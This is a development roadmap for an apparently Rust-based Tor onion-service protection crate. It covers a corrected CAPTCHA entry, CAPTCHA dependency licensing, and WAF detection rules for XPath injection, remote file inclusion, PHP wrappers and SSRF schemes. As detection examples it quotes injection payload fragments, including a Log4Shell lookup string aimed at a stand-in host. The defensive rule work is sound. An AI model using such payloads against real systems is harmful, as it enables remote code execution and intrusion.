- [ ] **`CaptchaChallenge` (server-rendered image, no JS) — NOT built. This checkbox was ticked in error and is corrected here (2026-07-17).** The Phase 1 line claimed CAPTCHA *and* the tarpit together; only the tarpit shipped. Verified rather than assumed: there is no `CaptchaChallenge` type and no `captcha` module anywhere in the crate (`challenge/` holds `pow`, `equix`, `patience` only), nothing renders an image, and `layer.rs`'s own comment says *"When CAPTCHA lands as a second submitting gate…"* — the code never believed this shipped. What exists is `ClearanceLevel::Captcha`, a *token-vocabulary* variant no `Challenge` mints, which is most likely what the tick was read off. Both READMEs advertised the tier to users ("Skin degrades (PoW → CAPTCHA → patience tarpit)", and the host's architecture diagram) and are corrected in the same commit. **Impact is real but bounded:** a no-JS client is still served — it falls to the tarpit — so this is a *missing tier*, not a hole; the gap is that a no-JS human gets a delay instead of a human-verification step, and the tarpit cannot distinguish a patient bot from a patient human.
  - *Dependency decision — resolves the "captcha crate license audit" open question below, so that question is now closed.* **`captcha` 1.0.0** (2025-03-19, ~900k downloads — the mainstream choice) is **actually MIT**: GitHub's licence detector reads its `LICENSE.md` as the MIT License. crates.io renders it **"non-standard"** only because the manifest declares `license-file = "LICENSE.md"` instead of the SPDX `license` field (<https://crates.io/api/v1/crates/captcha/1.0.0>, <https://github.com/daniel-e/captcha>). **That distinction is not cosmetic here:** cargo-deny matches the licence allowlist against SPDX metadata, so a `license-file`-only crate lands in the licences check as unlicensed and **fails the CI `deny` job** until deny.toml carries a `[[licenses.clarify]]` entry pinning the crate, the licence, and the file hash. Budget that as part of adoption, not a surprise.
  - *The rest of the adoption cost, measured from its manifest:* `captcha` 1.0.0 pulls `image` 0.24 (`default-features = false`, `png`), `lodepng` 3.6.1, `base64` **0.13** (old — a second base64 version in the tree), `serde_json`, and `rand` 0.9 (which does at least match skin's). Its `default = ["audio"]` feature drags in `hound` for audio CAPTCHAs, so any adoption must be `default-features = false` — a plain `captcha = "1.0"` takes a whole audio stack for nothing. Note this is the same heavy `image` tree the workspace deliberately dropped from `qrcode` (see the root manifest's comment), so adopting it partly re-imports what was already refused once.
  - *No-FFI rule: `lodepng` passes, and the name is a trap.* It is a **pure-Rust port** of the C LodePNG (converted with Citrus, then refactored — upstream's README: "There is no C any more!"), licensed **Zlib**; its `ffi` module is a C-compatible API surface *exported for C callers*, not a binding *to* C. So it does not violate the rule — but `Zlib` would need adding to deny.toml's allowlist (<https://github.com/kornelski/lodepng-rust>, <https://crates.io/crates/lodepng>).
  - *The alternative, and why it is probably not it:* **`easy-captcha` 0.1.3** is cleanly `MIT OR Apache-2.0` with real SPDX metadata (no clarify entry needed), but it has ~4.3k lifetime downloads and no release since **2024-02-08** — on a security-facing dependency that is a maintenance risk that outweighs the packaging convenience (<https://crates.io/api/v1/crates/easy-captcha>).
  - *Recommendation for the run that takes this:* **hand-roll the renderer**, do not take either dep. The requirement is one distorted image from a short character set rendered to PNG — the crate value here is mostly the distortion, and both candidates cost more than they save (`captcha`: a deny.toml clarify entry + the `image` tree the workspace already refused + an old `base64`; `easy-captcha`: an unmaintained security dep). If a PNG encoder is wanted rather than hand-rolling one, `lodepng` alone is pure Rust, Zlib, and maintained. Whichever way, the *decision* is no longer the blocker — the blocker is now just the work.

## Phase 2 — Tor dimension & Under Attack Mode — `v0.2`

- [x] `CircuitPolicy` + per-circuit accounting (streams, request rate, bytes); `CircuitAction` including `Shutdown`
- [x] onyums adapter wiring `CircuitPolicy` to `RendRequest` / `StreamRequest`
- [x] Under Attack Mode — force every new circuit through the gate before serving
- [x] Adaptive PoW difficulty — dormant under normal load, raised under attack, driven by app-observable request rate

## Phase 3 — WAF — `v0.3`

- [x] Pure-Rust engine — `regex` + `aho-corasick` multi-signature matching as a `tower` layer over URI/method/headers/body, with normalization
- [x] Rule-expression front-end — `filter::FilterExpr` typed AST + evaluator (replaces `wirefilter`, whose published crate drags in the unmaintained `failure` dep, RUSTSEC-2020-0036)
- [x] String-syntax rule parser — lexer + recursive-descent `FilterExpr::parse` / `FromStr`, canonical `Display` as the parser's inverse
- [x] Curated starter ruleset — SQLi / XSS / path traversal / command & code injection / SSRF / NoSQL / LDAP / XXE / protocol anomalies
- [x] Operator control — custom rules, per-rule/category disabling, tunable per-category anomaly weights, anomaly scoring surfaced

## Phase 4 — Observability & adaptive defense — `v0.4`

- [x] Structured security events — challenge issued/passed/failed, WAF blocks, rate-limit trips, circuit teardowns — as typed events
- [x] Per-token / per-circuit metrics — active circuits, gate pass rates, difficulty in play
- [x] Request-shape baselining — learn the normal distribution of Tor-surviving HTTP dimensions and flag deviation
- [x] Deviation-driven adaptive difficulty (feeds onyums' Phase 4 observability)

  - [x] XPath node-function coverage — the node-test-in-predicate forms the initial axis/FLWOR rules skipped. The anchor the deferral asked for turned out to be the *opening* bracket, not a predicate-close: `xpathi_predicate_function` requires the node test/function to **open a predicate** (`[text()='admin']`, `[position()=1]`, `[substring(name(),1,4)=…]`, the `[not(contains(…))]` negation form), which is exactly what jQuery's `.text()` and a posted `s.substring(0,4)` lack. `xpathi_attribute_predicate` covers the abbreviated attribute axis compared to a literal (`[@name='admin']`, `[@id=1]`, `[@role=$r]`) — the classic auth break-out — requiring *both* a comparison operator and a quote/digit/`$` head so an `[@alice]` mention and a bare `[@key=value]` tag syntax stay clean. `concat(`/`translate(`/`node(` deliberately left out (the first two are equally SQL/JS idioms; `node()` only rides an axis step).   - [x] **Finding — `//*` mis-attributes to Sqli, and it is not fixable without a worse trade.** The XPath wildcard step `//*` *contains* `/*`, the SQL comment opener, so any `//*[…]` payload trips a Sqli rule before the XPath rules are reached (first-match order runs Sqli first). It still **blocks** — the load-bearing part — but the category an operator sees on their event stream reads `sqli`, not `xpath_injection`. Left as-is deliberately: re-ordering the rule table to fix one label would move attribution for every overlapping payload in the whole set. Both the block and the mis-label are pinned by `xpath_wildcard_node_set_attributes_to_the_sql_comment_rule_first`, and `inspect_all` (the scoring path) still surfaces the XPath rule, so a scoring operator loses nothing
  - [x] Remote file inclusion as a first-class `WafCategory::Rfi` (dense index 12, ALL now 13) — the CRS **931xxx** class, previously absent entirely and not covered by its neighbours: `PathTraversal` is *local* inclusion, and `Ssrf` makes the server *fetch* an internal URL but never *execute* it; RFI is the one that ends in RCE. `rfi_include_param_remote_url` keys on the **pair** — a load-this-as-code parameter name (`include`/`require(_once)`/`template`/`tpl`/`page`/`file`/`conf`/`module`/…) set to a remote `http(s)`/`ftp(s)` URL — because each half alone is ordinary; the name list deliberately **excludes** the params that legitimately carry URLs (`url`/`link`/`redirect(_uri)`/`next`/`return`/`callback`/`src`/`image`/`doc`/`view`), which is where CRS's own far broader 931110 list is a known PL1 false-positive source. `rfi_url_trailing_question` ports **rule 931120** — a remote URL whose value ends at a bare `?`, the truncation trick against `include($_GET['p'] . '/footer.php')` — anchored to the value boundary (`&` or end of field) so an ordinary URL carrying a query stays clean (<https://github.com/coreruleset/coreruleset/blob/main/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf>)
  - [x] PHP `data://` stream wrapper — added to `traversal_php_wrapper` beside `php`/`phar`/`expect`/`zip`/`glob`. It was the significant omission of the set: with `allow_url_include` on, `data://text/plain;base64,PD9waHA…` hands the interpreter an entire script **inline**, so there is no remote host to reach — neither the new `Rfi` rules (which require a remote URL) nor a network egress control ever sees it. Distinct from the `data:` URI the XSS rules already match: that one has no `//` and targets the browser; this one targets the server (<https://www.php.net/manual/en/wrappers.data.php>)
  - [x] **Session fixation (CRS 943xxx) — considered 2026-07-17 and deliberately NOT ported. Do not add it without a new argument.** The rule shape is a session-id parameter in the URL (`?PHPSESSID=`/`?jsessionid=`/`?sid=`), optionally paired with an off-host `Referer`. It is a poor fit *here specifically*, and the reason is the thing that makes this crate different: **Tor Browser users routinely block or partition cookies**, so a URL-carried session id is a *more* plausible legitimate pattern on an onion service than on the open web — precisely inverting the base rate CRS's rule assumes. Blocking it would fire on a no-JS/no-cookie client doing something the app deliberately supports. The signal is also aimed at the wrong party: session fixation is a flaw in *the app's* session handling (accepting an attacker-supplied session id), which a request-value signature cannot see — a WAF match here says a session id is in a URL, not that the app is vulnerable. This is a case where the ruleset's own principle ("the WAF is best-effort telemetry, never a substitute for the app doing the right thing") argues against porting rather than for it
  - [x] Remaining fetchable SSRF schemes — `ssrf_uncommon_scheme`: `ldap(s)`/`tftp`/`sftp`/`netdoc`, past the existing `gopher`/`dict`/`file` trio. **Placed after the Log4Shell rules rather than with its `ssrf_*` siblings, deliberately**: rule order *is* first-match order and `${jndi:ldap://evil/a}` contains `ldap://`, so an `ldap` alternative up in the SSRF block would have matched Log4Shell payloads before `code_log4shell_jndi` ran and silently re-labelled the most recognisable RCE in the set as an SSRF. regex-crate patterns have no lookbehind, so *placement* is the tool. Pinned by `ssrf_scheme_ordering_keeps_log4shell_attribution` — this is the same first-match hazard as the `//*` finding above, caught before shipping rather than after
  - [ ] Track CRSLang: CRS is replacing Seclang with a YAML rule language in its next major release — under **active development in a dedicated repo** (Go, Apache-2.0) and a headline topic at **Open WAF Day 2026** (Vienna, 2026-06-24, now past) (<https://github.com/coreruleset/coreruleset/wiki/Workshop:-Updates-on-new-CRS-Language>).
    - *Checked 2026-07-17 — it has shipped tags, and the finding cuts against this item's own premise.* Latest is **v0.2.0 (2026-06-27)**, after **v0.1.0 (2025-11-07)**; still pre-1.0 with **no stability or finalization statement** in the release notes, so the grammar is *firming*, not firm. The v0.2.0 headline is a **WebAssembly build exposing the translation API to JavaScript**, which powers a browser **playground** at <https://crslang.coreruleset.org/> — that is the cheap way to read the real grammar without a Go toolchain (<https://github.com/coreruleset/crslang/releases>).
    - *The premise to correct:* this item calls CRSLang "the reference point for `FilterExpr`'s string grammar", and that is **not what CRSLang turned out to be**. CRSLang is a *structured YAML document* — metadata (phase/id/msg/severity/tags), a `conditions` array of {collection, variable, operator, transformations}, disruptive/non-disruptive actions, and `chain` — with operators spelled `rx`/`pm`/`eq` plus negation. `FilterExpr` is a **boolean expression language in a single string** (wirefilter's shape). They are different surfaces solving different halves: CRSLang is a *serialization* of a rule (what Seclang was), `FilterExpr` is an *expression* inside one rule. So CRSLang is not a grammar to converge on; the honest question it raises is narrower — **should skin be able to ingest a CRSLang YAML rule** (a translation target), which is a real potential feature and a much bigger item than grammar alignment. Re-scope before taking it; do not port a grammar that was never the same shape. CRS **4.28.0** remains the latest major (re-confirmed 2026-07-14 — no 4.29; <https://github.com/coreruleset/coreruleset/releases>); the LTS track got a **4.25.1** patch (2026-07-02) and 4.25.x is the first LTS (CRS 3.3.x EOL Q3 2026) — peg future ports to the 4.25 LTS + 4.28 baselines. The intermediate **4.27.0** (2026-06-01) was a content-type-trust engine fix (rules 920240/920400) with no portable request-value signatures (<https://www.linuxcompatible.org/story/owasp-crs-4270-update-fix-broken-header-checks-without-breaking-your-waf>)
